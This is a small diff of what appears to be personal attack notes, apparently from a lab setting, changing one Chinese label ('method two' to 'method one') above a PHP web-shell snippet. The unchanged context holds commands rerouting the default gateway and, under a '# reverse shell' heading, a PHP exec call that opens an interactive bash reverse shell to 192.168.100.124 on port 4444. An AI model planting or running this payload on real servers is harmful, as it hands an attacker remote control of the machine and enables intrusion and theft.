@@ -8,8 +8,7 @@ sudo ip route del default
 sudo ip route add default via 192.168.100.150
 
 # reverse shell
-
-寫法二：
+寫法一：
 <?php
 exec("/bin/bash -c 'bash -i >& /dev/tcp/192.168.100.124/4444 0>&1'");
 ?>
